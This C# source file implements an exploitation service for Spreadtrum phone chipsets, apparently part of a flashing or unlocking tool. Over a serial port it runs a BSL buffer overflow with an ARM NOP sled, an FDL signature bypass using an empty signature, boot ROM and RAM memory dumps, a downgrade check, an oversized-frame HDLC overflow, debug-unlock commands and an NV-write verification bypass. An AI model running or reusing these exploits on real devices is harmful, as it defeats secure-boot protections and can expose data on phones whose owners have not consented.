// ============================================================================
// LoveAlways - Spreadtrum Exploitation Service
// ============================================================================

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// Eng Translation & some fixes by iReverse - HadiKIT - Hadi Khoirudin, S.Kom.
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


using LoveAlways.Spreadtrum.Protocol;
using LoveAlways.Spreadtrum.Resources;
using System;
using System.Drawing;
using System.IO.Ports;
using System.Threading;
using System.Threading.Tasks;

namespace LoveAlways.Spreadtrum.Exploit
{
    /// <summary>
    /// Spreadtrum Exploitation Service
    /// </summary>
    public class SprdExploitService
    {
        private readonly Action<string, Color> _log;
        private readonly HdlcProtocol _hdlc;
        private SerialPort _port;
        private uint _currentChipId;

        // Events
        public event Action<SprdVulnerabilityCheckResult> OnVulnerabilityDetected;
        public event Action<SprdExploitResult> OnExploitCompleted;

        public SprdExploitService(Action<string, Color> log = null)
        {
            _log = log ?? ((msg, c) => { });
            _hdlc = new HdlcProtocol();
        }

        #region Vulnerability Detection

        /// <summary>
        /// Detect device vulnerabilities
        /// </summary>
        public SprdVulnerabilityCheckResult CheckVulnerability(uint chipId, string pkHash = null)
        {
            Log("[Exploit] ========== Vulnerability Check ==========", Color.Cyan);
            Log(string.Format("[Exploit] Chip ID: 0x{0:X}", chipId), Color.White);

            if (!string.IsNullOrEmpty(pkHash))
            {
                string shortHash = pkHash.Length > 16 ? pkHash.Substring(0, 16) + "..." : pkHash;
                Log(string.Format("[Exploit] PK Hash: {0}", shortHash), Color.White);
            }

            var result = SprdExploitDatabase.CheckVulnerabilities(chipId, pkHash);

            if (result.HasVulnerability)
            {
                if (result.IsUnfused)
                {
                    Log("[Exploit] ✓ Unfused device detected!", Color.Green);
                }
                else
                {
                    Log(string.Format("[Exploit] ✓ {0} available vulnerabilities detected", result.AvailableExploits.Count), Color.Green);
                }

                Log(string.Format("[Exploit] Recommended: {0}", result.RecommendedExploit), Color.Yellow);

                foreach (var vuln in result.AvailableExploits)
                {
                    Log(string.Format("[Exploit]   - {0} ({1}★): {2}",
                        vuln.Name, vuln.SuccessRate, vuln.Description), Color.Gray);
                }
            }
            else
            {
                Log("[Exploit] ✗ No known vulnerability detected", Color.Orange);
            }

            Log("[Exploit] ==================================", Color.Cyan);

            OnVulnerabilityDetected?.Invoke(result);
            return result;
        }

        #endregion

        #region Exploitation

        /// <summary>
        /// Attempt automatic exploitation
        /// </summary>
        public async Task<SprdExploitResult> TryExploitAsync(
            SerialPort port,
            uint chipId,
            string pkHash = null,
            CancellationToken ct = default(CancellationToken))
        {
            _port = port;
            _currentChipId = chipId;

            Log("[Exploit] Starting exploitation...", Color.Yellow);

            try
            {
                // 1. Detect vulnerabilities
                var vulnCheck = CheckVulnerability(chipId, pkHash);
                if (!vulnCheck.HasVulnerability)
                {
                    var failResult = new SprdExploitResult
                    {
                        Success = false,
                        Message = "No available vulnerability detected"
                    };
                    OnExploitCompleted?.Invoke(failResult);
                    return failResult;
                }

                // 2. Unfused device success immediately
                if (vulnCheck.IsUnfused)
                {
                    var unfusedResult = new SprdExploitResult
                    {
                        Success = true,
                        UsedExploit = SprdExploitType.FdlSignatureBypass,
                        Message = "Unfused device, any FDL can be loaded"
                    };
                    OnExploitCompleted?.Invoke(unfusedResult);
                    return unfusedResult;
                }

                // 3. Attempt exploits by priority
                foreach (var vuln in vulnCheck.AvailableExploits)
                {
                    ct.ThrowIfCancellationRequested();

                    Log(string.Format("[Exploit] Attempting: {0}...", vuln.Name), Color.Yellow);

                    SprdExploitResult result = null;

                    switch (vuln.Type)
                    {
                        case SprdExploitType.BslOverflow:
                            result = await ExploitBslOverflowAsync(ct);
                            break;

                        case SprdExploitType.FdlSignatureBypass:
                            result = await ExploitSignatureBypassAsync(ct);
                            break;

                        case SprdExploitType.MemoryRead:
                            result = await ExploitMemoryReadAsync(ct);
                            break;

                        case SprdExploitType.Downgrade:
                            result = await ExploitDowngradeAsync(ct);
                            break;

                        case SprdExploitType.HdlcOverflow:
                            result = await ExploitHdlcOverflowAsync(ct);
                            break;

                        case SprdExploitType.DebugMode:
                            result = await ExploitDebugModeAsync(ct);
                            break;

                        case SprdExploitType.NvBypass:
                            result = await ExploitNvBypassAsync(ct);
                            break;
                    }

                    if (result != null && result.Success)
                    {
                        Log(string.Format("[Exploit] ✓ {0} successful!", vuln.Name), Color.Green);
                        OnExploitCompleted?.Invoke(result);
                        return result;
                    }
                    else
                    {
                        Log(string.Format("[Exploit] ✗ {0} failed", vuln.Name), Color.Orange);
                    }
                }

                var finalResult = new SprdExploitResult
                {
                    Success = false,
                    Message = "All exploitation methods failed"
                };
                OnExploitCompleted?.Invoke(finalResult);
                return finalResult;
            }
            catch (Exception ex)
            {
                Log(string.Format("[Exploit] Error: {0}", ex.Message), Color.Red);
                var errorResult = new SprdExploitResult
                {
                    Success = false,
                    Message = ex.Message
                };
                OnExploitCompleted?.Invoke(errorResult);
                return errorResult;
            }
        }

        #endregion

        #region BSL Overflow Vulnerability

        /// <summary>
        /// BSL protocol overflow exploitation
        /// </summary>
        private async Task<SprdExploitResult> ExploitBslOverflowAsync(CancellationToken ct)
        {
            Log("[Exploit] Attempting BSL protocol overflow...", Color.Gray);

            try
            {
                // 1. Try using embedded exploit payload
                uint fdl1Addr = SprdPlatform.GetFdl1Address(_currentChipId);
                byte[] exploitPayload = SprdResourceLoader.GetExploitPayload(fdl1Addr);

                if (exploitPayload != null && exploitPayload.Length > 0)
                {
                    Log($"[Exploit] Using preset exploit payload ({exploitPayload.Length} bytes)", Color.Cyan);

                    // Send exploit payload
                    await WriteAsync(exploitPayload, ct);
                    await Task.Delay(300, ct);

                    // Check response
                    var response = await ReadAsync(1000, ct);
                    if (response != null && response.Length > 0)
                    {
                        try
                        {
                            var parsed = _hdlc.ParseFrame(response);
                            if (parsed.Type == (byte)BslCommand.BSL_REP_ACK)
                            {
                                return new SprdExploitResult
                                {
                                    Success = true,
                                    UsedExploit = SprdExploitType.BslOverflow,
                                    Message = "BSL overflow successful (preset payload)"
                                };
                            }
                        }
                        catch
                        {
                            // Parsing failure may mean device state changed, try to continue
                        }
                    }
                }
                else
                {
                    Log("[Exploit] No preset payload, using generic overflow method", Color.Yellow);
                }

                // 2. Generic overflow method - send specially crafted BSL connection request
                byte[] payload = new byte[0x1000];

                // Fill with NOP sled (ARM)
                for (int i = 0; i < payload.Length - 64; i += 4)
                {
                    payload[i] = 0x00;
                    payload[i + 1] = 0x00;
                    payload[i + 2] = 0xA0;
                    payload[i + 3] = 0xE1;  // MOV R0, R0 (NOP)
                }

                // Build HDLC frame
                var frame = _hdlc.BuildFrame((byte)BslCommand.BSL_CMD_CONNECT, payload);
                await WriteAsync(frame, ct);

                await Task.Delay(200, ct);

                // Check response
                var response2 = await ReadAsync(1000, ct);
                if (response2 != null && response2.Length > 0)
                {
                    try
                    {
                        var parsed = _hdlc.ParseFrame(response2);
                        if (parsed.Type == (byte)BslCommand.BSL_REP_ACK)
                        {
                            return new SprdExploitResult
                            {
                                Success = true,
                                UsedExploit = SprdExploitType.BslOverflow,
                                Message = "BSL overflow successful"
                            };
                        }
                    }
                    catch
                    {
                        // Parsing failure may mean device state changed
                    }
                }

                return new SprdExploitResult { Success = false, Message = "BSL overflow failed" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = ex.Message };
            }
        }

        #endregion

        #region Signature Bypass

        /// <summary>
        /// FDL signature bypass exploitation
        /// </summary>
        private async Task<SprdExploitResult> ExploitSignatureBypassAsync(CancellationToken ct)
        {
            Log("[Exploit] Attempting signature bypass...", Color.Gray);

            try
            {
                // Certain old chips do not verify signatures under specific conditions
                // 1. Send special version query
                var versionCmd = _hdlc.BuildCommand((byte)BslCommand.BSL_CMD_READ_VERSION);
                await WriteAsync(versionCmd, ct);

                await Task.Delay(100, ct);

                var response = await ReadAsync(500, ct);
                if (response != null && response.Length > 0)
                {
                    try
                    {
                        var parsed = _hdlc.ParseFrame(response);

                        // Check if version info indicates signature can be bypassed
                        if (parsed.Payload != null && parsed.Payload.Length >= 4)
                        {
                            uint version = BitConverter.ToUInt32(parsed.Payload, 0);

                            // Known vulnerable versions
                            if (version < 0x0200)  // Below version 2.0
                            {
                                Log(string.Format("[Exploit] Boot ROM version: 0x{0:X4}, likely bypassable", version), Color.Yellow);

                                return new SprdExploitResult
                                {
                                    Success = true,
                                    UsedExploit = SprdExploitType.FdlSignatureBypass,
                                    Message = "Signature validation can be bypassed"
                                };
                            }
                        }
                    }
                    catch { }
                }

                // 2. Attempt to send empty signature
                var emptySignature = new byte[256];
                var signCmd = _hdlc.BuildFrame((byte)BslCommand.BSL_CMD_SEND_SIGNATURE, emptySignature);
                await WriteAsync(signCmd, ct);

                await Task.Delay(200, ct);

                response = await ReadAsync(500, ct);
                if (response != null)
                {
                    try
                    {
                        var parsed = _hdlc.ParseFrame(response);
                        if (parsed.Type == (byte)BslCommand.BSL_REP_ACK)
                        {
                            return new SprdExploitResult
                            {
                                Success = true,
                                UsedExploit = SprdExploitType.FdlSignatureBypass,
                                Message = "Empty signature accepted"
                            };
                        }
                    }
                    catch { }
                }

                return new SprdExploitResult { Success = false, Message = "Signature bypass failed" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = ex.Message };
            }
        }

        #endregion

        #region Memory Read Vulnerability

        /// <summary>
        /// Memory read exploitation
        /// </summary>
        private async Task<SprdExploitResult> ExploitMemoryReadAsync(CancellationToken ct)
        {
            Log("[Exploit] Attempting memory read vulnerability...", Color.Gray);

            try
            {
                // Attempt to read sensitive memory areas
                uint[] targetAddresses = new uint[]
                {
                    0x00000000,  // Boot ROM
                    0x50000000,  // IRAM
                    0x80000000,  // DRAM
                    0xFFFF0000   // Interrupt vector table
                };

                foreach (uint addr in targetAddresses)
                {
                    ct.ThrowIfCancellationRequested();

                    // Build memory read command
                    byte[] payload = new byte[8];
                    BitConverter.GetBytes(addr).CopyTo(payload, 0);
                    BitConverter.GetBytes((uint)0x100).CopyTo(payload, 4);  // Read 256 bytes

                    var readCmd = _hdlc.BuildFrame((byte)BslCommand.BSL_CMD_READ_FLASH, payload);
                    await WriteAsync(readCmd, ct);

                    await Task.Delay(100, ct);

                    var response = await ReadAsync(1000, ct);
                    if (response != null && response.Length > 10)
                    {
                        try
                        {
                            var parsed = _hdlc.ParseFrame(response);
                            if (parsed.Type == (byte)BslCommand.BSL_REP_DATA &&
                                parsed.Payload != null &&
                                parsed.Payload.Length > 0)
                            {
                                Log(string.Format("[Exploit] ✓ Successfully read address 0x{0:X8}, {1} bytes",
                                    addr, parsed.Payload.Length), Color.Green);

                                return new SprdExploitResult
                                {
                                    Success = true,
                                    UsedExploit = SprdExploitType.MemoryRead,
                                    Message = string.Format("Successfully read 0x{0:X8}", addr),
                                    ExtractedData = parsed.Payload
                                };
                            }
                        }
                        catch { }
                    }
                }

                return new SprdExploitResult { Success = false, Message = "Memory read failed" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = ex.Message };
            }
        }

        #endregion

        #region Downgrade Attack

        /// <summary>
        /// Downgrade attack
        /// </summary>
        private async Task<SprdExploitResult> ExploitDowngradeAsync(CancellationToken ct)
        {
            Log("[Exploit] Attempting downgrade attack...", Color.Gray);

            try
            {
                // Check anti-rollback status
                var versionCmd = _hdlc.BuildCommand((byte)BslCommand.BSL_CMD_READ_VERSION);
                await WriteAsync(versionCmd, ct);

                await Task.Delay(100, ct);

                var response = await ReadAsync(500, ct);
                if (response != null)
                {
                    try
                    {
                        var parsed = _hdlc.ParseFrame(response);
                        if (parsed.Payload != null && parsed.Payload.Length >= 8)
                        {
                            uint currentVersion = BitConverter.ToUInt32(parsed.Payload, 0);
                            uint minVersion = BitConverter.ToUInt32(parsed.Payload, 4);

                            Log(string.Format("[Exploit] Current version: 0x{0:X}, Minimum version: 0x{1:X}",
                                currentVersion, minVersion), Color.Gray);

                            // If no anti-rollback or minimum version is 0
                            if (minVersion == 0)
                            {
                                return new SprdExploitResult
                                {
                                    Success = true,
                                    UsedExploit = SprdExploitType.Downgrade,
                                    Message = "No anti-rollback protection, older FDL can be used"
                                };
                            }
                        }
                    }
                    catch { }
                }

                return new SprdExploitResult { Success = false, Message = "Downgrade attack failed" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = ex.Message };
            }
        }

        #endregion

        #region HDLC Overflow

        /// <summary>
        /// HDLC frame overflow exploitation
        /// </summary>
        private async Task<SprdExploitResult> ExploitHdlcOverflowAsync(CancellationToken ct)
        {
            Log("[Exploit] Attempting HDLC overflow...", Color.Gray);

            try
            {
                // Send malformed HDLC frame
                // 1. Oversized frame
                byte[] oversizedFrame = new byte[0x10000];
                oversizedFrame[0] = 0x7E;  // Start flag
                for (int i = 1; i < oversizedFrame.Length - 1; i++)
                {
                    oversizedFrame[i] = 0x41;
                }
                oversizedFrame[oversizedFrame.Length - 1] = 0x7E;  // End flag

                await WriteAsync(oversizedFrame, ct);
                await Task.Delay(300, ct);

                // 2. Check device status
                var statusCmd = _hdlc.BuildCommand((byte)BslCommand.BSL_CMD_CHECK_BAUD);
                await WriteAsync(statusCmd, ct);

                await Task.Delay(100, ct);

                var response = await ReadAsync(500, ct);
                if (response != null && response.Length > 0)
                {
                    // Device still responds, but status may have changed
                    return new SprdExploitResult
                    {
                        Success = false,
                        Message = "HDLC overflow did not trigger exception"
                    };
                }
                else
                {
                    // No response may mean crash
                    return new SprdExploitResult
                    {
                        Success = true,
                        UsedExploit = SprdExploitType.HdlcOverflow,
                        Message = "HDLC overflow may have triggered"
                    };
                }
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = ex.Message };
            }
        }

        #endregion

        #region Debug Mode

        /// <summary>
        /// Debug mode activation
        /// </summary>
        private async Task<SprdExploitResult> ExploitDebugModeAsync(CancellationToken ct)
        {
            Log("[Exploit] Attempting to activate debug mode...", Color.Gray);

            try
            {
                // Attempt various debug commands
                byte[][] debugCommands = new byte[][]
                {
                    // Engineering mode command
                    new byte[] { 0x00, 0x01, 0xFF, 0xFF },  
                    // Debug unlock
                    new byte[] { 0xDE, 0xBB, 0x60, 0x00 },
                    // Special handshake
                    new byte[] { 0x55, 0xAA, 0x55, 0xAA }
                };

                foreach (var cmd in debugCommands)
                {
                    ct.ThrowIfCancellationRequested();

                    var frame = _hdlc.BuildFrame(0xFF, cmd);  // Use undefined command
                    await WriteAsync(frame, ct);

                    await Task.Delay(100, ct);

                    var response = await ReadAsync(300, ct);
                    if (response != null && response.Length > 0)
                    {
                        try
                        {
                            var parsed = _hdlc.ParseFrame(response);
                            // Check for unexpected success response
                            if (parsed.Type == (byte)BslCommand.BSL_REP_ACK ||
                                parsed.Type == 0xFF)
                            {
                                return new SprdExploitResult
                                {
                                    Success = true,
                                    UsedExploit = SprdExploitType.DebugMode,
                                    Message = "Debug mode activated"
                                };
                            }
                        }
                        catch { }
                    }
                }

                return new SprdExploitResult { Success = false, Message = "Debug mode activation failed" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = ex.Message };
            }
        }

        #endregion

        #region NV Bypass

        /// <summary>
        /// NV verification bypass
        /// </summary>
        private async Task<SprdExploitResult> ExploitNvBypassAsync(CancellationToken ct)
        {
            Log("[Exploit] Attempting NV verification bypass...", Color.Gray);

            try
            {
                // Attempt to write NV without verification
                // Use special NV item ID
                byte[] nvPayload = new byte[6];
                BitConverter.GetBytes((ushort)0xFFFF).CopyTo(nvPayload, 0);  // Special NV ID
                nvPayload[2] = 0x01;
                nvPayload[3] = 0x02;
                nvPayload[4] = 0x03;
                nvPayload[5] = 0x04;

                var nvCmd = _hdlc.BuildFrame((byte)BslCommand.BSL_CMD_WRITE_NVITEM, nvPayload);
                await WriteAsync(nvCmd, ct);

                await Task.Delay(200, ct);

                var response = await ReadAsync(500, ct);
                if (response != null)
                {
                    try
                    {
                        var parsed = _hdlc.ParseFrame(response);
                        if (parsed.Type == (byte)BslCommand.BSL_REP_ACK)
                        {
                            return new SprdExploitResult
                            {
                                Success = true,
                                UsedExploit = SprdExploitType.NvBypass,
                                Message = "NV verification bypassed"
                            };
                        }
                    }
                    catch { }
                }

                return new SprdExploitResult { Success = false, Message = "NV bypass failed" };
            }
            catch (Exception ex)
            {
                return new SprdExploitResult { Success = false, Message = ex.Message };
            }
        }

        #endregion

        #region Helper Methods

        private void Log(string message, Color color)
        {
            _log?.Invoke(message, color);
        }

        private async Task WriteAsync(byte[] data, CancellationToken ct)
        {
            if (_port == null || !_port.IsOpen)
                return;

            await _port.BaseStream.WriteAsync(data, 0, data.Length, ct);
        }

        private async Task<byte[]> ReadAsync(int timeoutMs, CancellationToken ct)
        {
            if (_port == null || !_port.IsOpen)
                return null;

            var buffer = new byte[0x10000];
            int totalRead = 0;
            var deadline = DateTime.Now.AddMilliseconds(timeoutMs);

            while (DateTime.Now < deadline && !ct.IsCancellationRequested)
            {
                if (_port.BytesToRead > 0)
                {
                    int toRead = Math.Min(_port.BytesToRead, buffer.Length - totalRead);
                    totalRead += _port.Read(buffer, totalRead, toRead);

                    // Check if complete frame received
                    if (totalRead > 0 && buffer[totalRead - 1] == 0x7E)
                        break;
                }
                else
                {
                    await Task.Delay(10, ct);
                }
            }

            if (totalRead == 0)
                return null;

            byte[] result = new byte[totalRead];
            Array.Copy(buffer, result, totalRead);
            return result;
        }

        #endregion
    }
}
